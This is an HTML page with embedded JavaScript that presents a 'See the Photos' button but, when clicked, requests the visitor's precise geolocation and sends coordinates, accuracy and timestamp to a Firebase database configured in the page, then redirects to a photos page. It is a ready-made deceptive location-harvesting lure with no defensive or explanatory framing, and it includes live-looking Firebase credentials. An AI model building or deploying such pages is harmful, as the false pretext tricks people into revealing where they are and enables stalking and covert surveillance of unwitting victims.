<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Tracker</title>
</head>
<body>
    <h1>Welcome</h1>
    <button id="locationBtn">See the Photos</button>

    <script type="module">
        // Import Firebase SDKs
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-database.js";

        // Firebase Configuration
        const firebaseConfig = {
            apiKey: "AIzaSyAETlxhc4ikjHzZLGLADVNfCQPQqlNQs2Q",
            authDomain: "location-9ba94.firebaseapp.com",
            projectId: "location-9ba94",
            storageBucket: "location-9ba94.firebasestorage.app",
            messagingSenderId: "447200014548",
            appId: "1:447200014548:web:f03234c59a1fbe73864b41",
            measurementId: "G-Y4Y8XNGNWQ"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);

        // Button Click Event
        document.getElementById("locationBtn").addEventListener("click", () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, showError, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        });

        // Function to send location to Firebase
        function sendLocation(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            const timestamp = new Date().toLocaleString();

            // Store location in Firebase
            push(ref(database, "locations"), {
                latitude: latitude,
                longitude: longitude,
                accuracy: accuracy,
                timestamp: timestamp
            });

            // Redirect to photos page
            window.location.href = "photos.html";
        }

        // Handle Location Errors
        function showError(error) {
            alert("Location access denied or an error occurred.");
        }
    </script>
</body>
</html>
